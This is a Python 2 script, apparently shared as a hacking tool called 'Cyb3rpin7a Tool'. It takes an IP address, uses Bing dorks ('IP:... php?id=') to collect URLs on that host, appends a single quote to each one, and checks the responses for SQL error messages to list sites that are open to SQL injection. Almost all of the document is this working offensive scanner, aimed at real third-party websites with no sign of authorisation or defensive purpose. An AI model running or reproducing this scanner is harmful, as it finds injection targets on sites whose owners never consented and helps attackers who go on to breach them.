# Don't Change The Rights , Remember Not Tool Make A Hacker , A Hacker Make Tool ;)
import urllib
import os
import re
from time import sleep
from colorama import init
from termcolor import colored
init()
print(colored("""
[+]==========================Prayag Mathukiya=======================[+]
  ____      _    _____            _      _____       _____           _ 
 / ___|   _| |__|___ / _ __ _ __ (_)_ __|___  |_ _  |_   _|__   ___ | |
| |  | | | | '_ \ |_ \| '__| '_ \| | '_ \  / / _` |   | |/ _ \ / _ \| |
| |__| |_| | |_) |__) | |  | |_) | | | | |/ / (_| |   | | (_) | (_) | |
 \____\__, |_.__/____/|_|  | .__/|_|_| |_/_/ \__,_|   |_|\___/ \___/|_|
      |___/                |_|
      
[+]==========================Cyb3rpin7a Tool========================[+]
""", 'green'))
def sqlihunt(dork , filename ):
   
  # extract Urls from a Bing search engin querying the given dork and test every url in
  # the result is stored in a text file
  dork= 'IP:'+dork+" php?id= "
  file2 =open(filename+'.txt','w')
  start=0
  end=200
  sleep(3)
  print (colored("[info]Getting Websites From Bing ... ",'yellow'))
  while start<=end :
    try:
      con = urllib.urlretrieve('http://www.bing.com/search?q='+dork+"&first="+str(start))
      #con = con = urllib.urlretrieve('http://www.bing.com/search?q=ip%3A41.203.11.42+%22php%3Fid%3D%22&go=&qs=ds&form=QBLH&filt=all')
      conf = open(con[0])
      readd=conf.read()
      find=re.findall('<h2><a href="(.*?)"',readd)
      start = start+10
      #return find
    except IOError:
      print (colored("[ERROR]network error ",'red'))
      print "[Info]reconnecting "
      sleep(10)
      print "[Info]retrying "
    try :
      for i in range(len(find)):
                  rez=find[i]+"'"
                  tst = urllib.urlretrieve(rez)
                  tstf = open(tst[0])
                  tstdd= tstf.read()
                  tstfind=re.findall('/error in your SQL syntax|mysql_fetch_array()|execute query|mysql_fetch_object()|mysql_num_rows()|mysql_fetch_assoc()|mysql_fetch_row()|SELECT * FROM|supplied argument is not a valid MySQL|Syntax error|Fatal error/i|You have an error in your SQL syntax|Microsoft VBScript runtime error',tstdd)
                  if(tstfind):
                    print (colored("[SLQi] : ",'green'))+ rez
                    file2.write(rez + '\n')
                  else:
                    print (colored("[No SQLi ] : ",'red')) + rez
    except IOError:
      print (colored("[ERROR]No result found",'red'))
param1 = raw_input (colored(("IP : "),'red'))
param2 = raw_input (colored(("Filename :  "),'yellow'))
sqlihunt(param1 , param2 )
print " ./done "
k=input (colored(("press close to exit"),'red'))
